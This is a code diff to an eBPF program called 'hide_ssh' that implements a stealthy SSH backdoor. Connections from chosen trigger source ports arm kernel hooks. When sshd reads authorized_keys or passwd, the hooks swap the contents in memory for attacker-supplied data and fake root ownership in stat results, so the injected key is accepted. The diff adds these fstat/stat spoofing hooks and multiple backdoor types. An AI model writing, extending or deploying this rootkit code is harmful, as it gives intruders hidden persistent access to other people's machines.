@@ -4,6 +4,8 @@
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_endian.h>
 
+#include "inputs.bpf.h"
+
 #define logprefix "hide_ssh: "
 #define bpf_printk(fmt, ...)                            \
 ({                                                      \
@@ -16,30 +18,18 @@
 #define PASSWD 2
 
 #define filename_len_max 128
-#define overwritten_content_len_max 65536
-
-
-/*
-    User defined variables
-*/
-
-const volatile unsigned short src_port = 2345;
-
-const volatile int overwritten_content_len = 0;
-const volatile char overwritten_content[overwritten_content_len_max];
-
-
-
 
 /*
     Overwritting struct elem
 */
+
 struct elem {
     int pid;
     int fd;
     unsigned long buff;
     int buff_len;
     int file_type;
+    struct stat *stat;
 };
 
 struct {
@@ -50,10 +40,15 @@ struct {
 } pid_elem SEC(".maps");
 
 /*
-    passwd data
+    stat() struct pointer holder
 */
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 4096);
+    __type(key, int); // pid_tgid
+    __type(value, long unsigned int); // struct stat
+} path_stats SEC(".maps");
 
-// TODO
 
 /*
     Port Trigger
@@ -62,6 +57,7 @@ struct {
 struct accept_args {
     struct sockaddr_in *addr;
     int *ttl;
+    int *backdoor_type;
 };
 
 struct {
@@ -69,7 +65,7 @@ struct {
     __uint(max_entries, 4);
     __type(key, int); // simple key (Arbitrary 0)
     __type(value, struct accept_args); // struct accept_args
-} next_uid SEC(".maps");
+} backdoor_trigger SEC(".maps");
 
 
 SEC("tp/syscalls/sys_enter_openat")
@@ -86,7 +82,7 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
     }
 
     const int key = 0;
-    int *port_triggered = bpf_map_lookup_elem(&next_uid, &key);
+    int *port_triggered = bpf_map_lookup_elem(&backdoor_trigger, &key);
     if (port_triggered == 0) {
         return 0;
     }
@@ -118,7 +114,7 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
                 if (i+14 > filename_len_max) {
                     break;
                 }
-                if (check_filename[i] == 'a' && check_filename[i+1] == 'u' && check_filename[i+2] == 't' && check_filename[i+3] == 'h' && check_filename[i+4] == 'o' && check_filename[i+5] == 'r' && check_filename[i+6] == 'i' && check_filename[i+7] == 'z' && check_filename[i+8] == 'e' && check_filename[i+9] == 'd' && check_filename[i+10] == '_' && check_filename[i+11] == 'k' && check_filename[i+12] == 'e' && check_filename[i+13] == 'y' && check_filename[i+14] == 's') {
+                if (check_filename[i] == 'a' && check_filename[i+1] == 'u' && check_filename[i+2] == 't' && check_filename[i+3] == 'h' && check_filename[i+4] == 'o' && check_filename[i+5] == 'r' && check_filename[i+6] == 'i' && check_filename[i+7] == 'z' && check_filename[i+8] == 'e' && check_filename[i+9] == 'd' && check_filename[i+10] == '_' && check_filename[i+11] == 'k' && check_filename[i+12] == 'e' && check_filename[i+13] == 'y' && check_filename[i+14] == 's' && check_filename[i+15] == 0) {
                     is_auth_key = 1;
                     break;
                 } else {
@@ -143,13 +139,13 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
         return 0;
     }
 
-    bpf_printk("openat_entrypoint[%d] path: %s\n", pid, ctx->args[1]);
     struct elem value = {
         .pid = pid,
         .fd = ctx->args[0],
         .buff = 0,
         .buff_len = 0,
-        .file_type = file_type
+        .file_type = file_type,
+        .stat = 0
     };
     bpf_map_update_elem(&pid_elem, &tgid, &value, 0);
     return 0;
@@ -169,13 +165,107 @@ int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
 
     if (ctx->ret < 0) {
         bpf_map_delete_elem(&pid_elem, &tgid);
-        bpf_map_delete_elem(&next_uid, &trigger_key);
+        bpf_map_delete_elem(&backdoor_trigger, &trigger_key);
+        return 0;
+    }
+    return 0;
+}
+
+SEC("tp/syscalls/sys_enter_close")
+int close_entrypoint(struct trace_event_raw_sys_enter *ctx)
+{
+    int tgid = bpf_get_current_pid_tgid();
+    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
+    if (e == 0) {
+        return 0;
+    }
+    if (e->fd == ctx->args[0]) {
+        bpf_map_delete_elem(&pid_elem, &tgid);
+    }
+    return 0;
+}
+
+
+SEC("tp/syscalls/sys_enter_newfstat")
+int fstat_entrypoint(struct trace_event_raw_sys_enter *ctx)
+{
+    int tgid = bpf_get_current_pid_tgid();
+    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
+    if (e == 0) {
+        return 0;
+    }
+    if (e->file_type == AUTHORIZED_KEYS && ctx->args[0] == e->fd) {
+        e->stat = (struct stat *)ctx->args[1];
+    }
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_newfstat")
+int fstat_exitpoint(struct trace_event_raw_sys_exit *ctx)
+{
+    int tgid = bpf_get_current_pid_tgid();
+    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
+    if (e == 0) {
+        return 0;
+    }
+    if (e->file_type == AUTHORIZED_KEYS && e->stat != 0) {
+        struct stat stat;
+        bpf_probe_read(&stat, sizeof(struct stat), e->stat);
+        // Overwrite st_uid and st_gid
+        stat.st_uid = 0;
+        stat.st_gid = 0;
+        bpf_probe_write_user(e->stat, (void*)&stat, sizeof(struct stat));
+        // bpf_printk("OVERWRITTEN AUTHORIZED_KEYS STATS\n");
+    }
+    return 0;
+}
+
+// Folder stat
+SEC("tp/syscalls/sys_enter_newstat")
+int newstat_entrypoint(struct trace_event_raw_sys_enter *ctx)
+{
+    int tgid = bpf_get_current_pid_tgid();
+    const int key = 0;
+    int *port_triggered = bpf_map_lookup_elem(&backdoor_trigger, &key);
+    if (port_triggered == 0) { // not actively triggered
+        return 0;
+    }
+    // am i sshd?
+    char comm[10];
+    bpf_get_current_comm(&comm, 10);
+    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
         return 0;
     }
 
-    bpf_printk("openat_exitpoint[%d]: fd = %d\n", tgid, ctx->ret);
+    // check if it's part of /home
+    char check_filename[filename_len_max];
+    bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[0]);
+    if (check_filename[0] != '/' || check_filename[1] != 'h' || check_filename[2] != 'o' || check_filename[3] != 'm' || check_filename[4] != 'e') {
+        return 0;
+    }
+    struct stat *statptr = (struct stat *)ctx->args[1];
+    bpf_map_update_elem(&path_stats, &tgid, &statptr, 0);
     return 0;
 }
+
+SEC("tp/syscalls/sys_exit_newstat")
+int newstat_exitpoint(struct trace_event_raw_sys_exit *ctx)
+{
+    int tgid = bpf_get_current_pid_tgid();
+    long unsigned int *stat_struct = bpf_map_lookup_elem(&path_stats, &tgid);
+    if (stat_struct == 0) {
+        return 0;
+    }
+    struct stat *stat_addr = *stat_struct;
+    struct stat stat;
+    bpf_probe_read(&stat, sizeof(struct stat), stat_addr);
+    // Overwrite st_uid and st_gid
+    stat.st_uid = 0;
+    stat.st_gid = 0;
+    bpf_probe_write_user(stat_addr, (void*)&stat, sizeof(struct stat));
+    bpf_map_delete_elem(&path_stats, &tgid);
+}
+
 
 SEC("tp/syscalls/sys_enter_read")
 int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
@@ -185,23 +275,18 @@ int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
     if (e == 0) {
         return 0;
     }
-
     if (e->fd != ctx->args[0]) {
-        bpf_printk("Error read_entrypoint[%d]: fd: %d != %d\n", tgid, e->fd, ctx->args[0]);
         return 0;
     }
-
     e->buff = ctx->args[1];
     e->buff_len = ctx->args[2];
-
-    bpf_printk("read_entrypoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
     return 0;
 }
 
 SEC("tp/syscalls/sys_exit_read")
 int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
 {
-    const int trigger_key = 0;
+    const int zero = 0;
     int tgid = bpf_get_current_pid_tgid();
     if (ctx->ret < 0) {
         return 0;
@@ -212,7 +297,7 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
 
-    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &trigger_key);
+    struct accept_args *args = bpf_map_lookup_elem(&backdoor_trigger, &zero);
     if (args == 0) {
         return 0;
     }
@@ -220,24 +305,51 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
     int file_type = e->file_type;
 
 
-    if (file_type == AUTHORIZED_KEYS && overwritten_content_len+1 > ctx->ret) {
-        bpf_printk("Error read_exitpoint[%d]: buff_len: %d < %d\n", tgid, ctx->ret, overwritten_content_len+1);
-        bpf_map_delete_elem(&pid_elem, &tgid);
-        bpf_map_delete_elem(&next_uid, &trigger_key);
-        return 0;
+    if (file_type == AUTHORIZED_KEYS && args->backdoor_type == AUTH_BACKDOOR)
+    {
+        char *auth_key = bpf_map_lookup_elem(&auth_elem, &zero);
+        if (auth_key == 0) {
+            return 0; // You should not be here
+        }
+        char* overwritten_content = auth_key;
+        int overwritten_content_len = 0;
+        for (int i = 0; i < 256; i++) { // TODO: Get it from userspace
+            if (overwritten_content[i] == 0) {
+                overwritten_content_len = i;
+                break;
+            }
+        }
+        overwritten_content_len += 1;
+
+        // check if original auth_key file is large enough for our privkey
+        if (overwritten_content_len > ctx->ret) {
+            bpf_map_delete_elem(&pid_elem, &tgid);
+            bpf_map_delete_elem(&backdoor_trigger, &zero);
+            return 0;
+        }
+
+        if (overwritten_content_len > 0 && overwritten_content_len < 256) {
+            bpf_probe_write_user((void*)e->buff, (void*) overwritten_content, overwritten_content_len);
+            // bpf_printk("OVERWRITTEN AUTHORIZED_KEYS");
+        }
     }
 
-    if (file_type == AUTHORIZED_KEYS) {
-        bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
-    } else if (file_type == PASSWD) {
-        // TODO: need to loop through each char and replace any 1-9 with 0
-        
+    if (file_type == PASSWD)
+    {
+        struct passwd_block *passwd = bpf_map_lookup_elem(&passwd_elem, &zero);
+        if (passwd == 0) {
+            return 0; // You should not be here
+        }
+        unsigned int passwd_len = passwd->buff_len;
+        if (ctx->ret > 0 && ctx->ret <= sizeof(passwd->buff)) {
+            bpf_probe_write_user((void*)e->buff, (void*) passwd->buff, ctx->ret);
+            // bpf_printk("OVERWRITTEN PASSWD");
+        }
     }
-    
-    bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
+
     bpf_map_delete_elem(&pid_elem, &tgid);
     if (ttl == 1) {
-        bpf_map_delete_elem(&next_uid, &trigger_key);
+        bpf_map_delete_elem(&backdoor_trigger, &zero);
     } else {
         args->ttl = ttl-1;
     }
@@ -259,10 +371,11 @@ int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
     struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
     struct accept_args args = {
         .addr = addr,
-        .ttl = 4 // doing a little hack
+        .ttl = 5, // doing a little hack
+        .backdoor_type = 0
     };
     const int key = 0;
-    bpf_map_update_elem(&next_uid, &key, &args, 0);
+    bpf_map_update_elem(&backdoor_trigger, &key, &args, 0);
     return 0;
 }
 
@@ -275,7 +388,7 @@ int accept_exitpoint(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
     const int key = 0;
-    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &key);
+    struct accept_args *args = bpf_map_lookup_elem(&backdoor_trigger, &key);
     if (args == 0) {
         return 0;
     }
@@ -286,10 +399,15 @@ int accept_exitpoint(struct trace_event_raw_sys_exit *ctx)
     };
     bpf_probe_read(&read, sizeof(struct sockaddr_in), args->addr);
     unsigned short port = __bpf_ntohs(read.sin_port);
-    if (port == src_port) {
+    
+    int *bk_type = bpf_map_lookup_elem(&trigger_ports, &port);
+    if (bk_type == 0) {
+        bpf_map_delete_elem(&backdoor_trigger, &key);
         return 0;
     }
-    bpf_map_delete_elem(&next_uid, &key);
+    if (*bk_type > 0 && *bk_type < 3) {
+        args->backdoor_type = *bk_type;
+    }
     return 0;
 }
 
